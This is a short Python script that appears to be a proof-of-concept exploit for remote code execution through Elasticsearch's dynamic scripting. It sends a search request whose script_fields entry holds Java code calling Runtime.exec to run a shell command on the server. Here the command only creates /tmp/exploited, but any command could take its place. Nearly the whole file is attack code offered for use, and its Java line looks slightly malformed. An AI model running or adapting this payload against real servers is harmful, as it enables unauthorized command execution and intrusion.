from datetime import datetime
from elasticsearch import Elasticsearch
import elasticsearch.helpers
import os, sys

host = os.environ.get("HOST") or "localhost"

exploit = """
import java.util.*;
import java.io.*;

String output = "";
BufferedReader br = new InputStreamReader(Runtime.getRuntime().exec("touch /tmp/exploited"));
"""

payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
      "run": exploit
   } 
}

es = Elasticsearch(host=host)
print es.search(payload)
